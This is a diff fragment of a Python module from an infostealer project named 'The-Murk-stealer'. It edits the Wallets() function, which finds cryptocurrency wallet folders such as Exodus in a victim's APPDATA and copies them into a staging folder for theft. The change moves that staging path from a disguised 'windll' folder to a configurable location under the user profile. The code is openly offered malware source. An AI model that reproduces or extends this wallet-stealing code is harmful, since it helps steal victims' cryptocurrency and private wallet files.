@@ -10,19 +10,20 @@
 #             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
 #-----------------------------------------------------------------------------#
 
-from os import getenv, mkdir
+from os import getenv, mkdir, environ
 from os.path import exists
 from winreg import QueryValue,HKEY_CURRENT_USER,OpenKey
 from manager.logger import Log
 from shutil import copytree
-
+from preferences.config import config
 
 def Wallets():
     msgInfo = ""
     Log("===========Wallets===========")
     msgInfo+="\n\n\n<b>💰Wallets💰</b>"
     roaming = getenv('APPDATA')
-    pathToLogs = f"{getenv('LOCALAPPDATA')}\\windll\\Wallets"
+    user = environ['USERPROFILE']
+    pathToLogs = f'{user}\\{config.pathToLogs}\\Wallets'
 
     directory = {
         'Exodus': roaming + '\\Exodus\\exodus.wallet\\',
